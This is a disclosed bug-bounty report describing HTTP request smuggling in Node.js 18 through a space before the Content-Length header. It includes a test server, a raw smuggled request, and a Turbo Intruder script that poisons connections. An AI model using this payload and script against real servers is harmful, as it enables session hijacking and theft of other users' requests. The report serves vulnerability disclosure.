# HTTP Request Smuggling via Content Length Obfuscation

## Report Details
- **Report ID**: 2237099
- **URL**: https://hackerone.com/reports/2237099
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-11-02T16:52:08.602Z
- **Disclosed**: 2024-05-03T14:55:56.399Z

## Reporter
- **Username**: bpingel
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** The default web service in the most recent version of 18.X seems to have an issue with the interpretation of malformed headers. If a space is left before a content-length header then the header is not read correctly. This leaves the ability to smuggle in a second request as the body of the first.

**Description:** HTTP request smuggling is present in applications running on the current version of the 18.X Node JS available for download from nodejs.org. When a space is placed before the content length header of a request it is not interpreted correctly and as a result the beginning of another request can be smuggled in the body. Formatted correctly it can consume portions of other user's requests or force them to access paths they did not intend to.

## Steps To Reproduce:

This simple Node JS application was used for replication and showing of desync in identification parameters within requests.

```
const http = require('http');
const port = 8082;

const server = http.createServer((req, res) => {
  if (req.url === '/hello') {
    console.log(JSON.stringify(req.headers));
    console.log('%s', req.url);
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello, World!\n');
  } else if (req.url === '/bye') {
    console.log('%s', req.url)
    console.log(JSON.stringify(req.headers));
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    const name = req.headers['x-name'] || 'World';
    res.end(`Goodbye, ${name}!\n`);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Route not found\n');
  }
});

server.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});
```
and the smuggled request would look like this
```
POST /hello HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
 Content-length: 43
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

GET /bye HTTP/1.1
x-name: Bob%s
X-YzBqv: 
```
With `x-name` header being the header used to have an ID present in the request be reflected in the response.


  1. Start up an application using the current version of Node JS 18, sample application above provided.
  2. This testing was done using the Turbo Intruder with the following script to simulate both an attacker poisoning the web socket as well as a legitimate user sending a request to the web service.

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    for word in range(1, 100):
        if word % 2:
            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)
            CleanReq = re.sub(r'GET [^v]*v: ', '\r\n', CleanReq)
            engine.queue(CleanReq, word)
        engine.queue(target.req, word)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    table.add(req)
```

{F2823458}

  3. During these requests to /hello you will begin to receive responses from the /bye url. The content-length header in regular request is swapped out with a test ID header to track which request ID is receiving which poisoned requests back. 

## Impact: Using this vulnerability we've already shown that a malicious user can affect the connections of regular users and in worst cases this can be used to steal session data from users as with the right formatting a request could be smuggled that can consume another users entire request, session data and all. As in this log you can see that the first line of a request is being consumed by a header, but this can be completed in other ways to consume more of a request.
{F2823460}

## Impact

Potential full compromise of users sessions on any service running a vulnerable version.

## Attachments
- Bob_Desync.png
- Cleaned_Request.png
- Header_Consumption.png
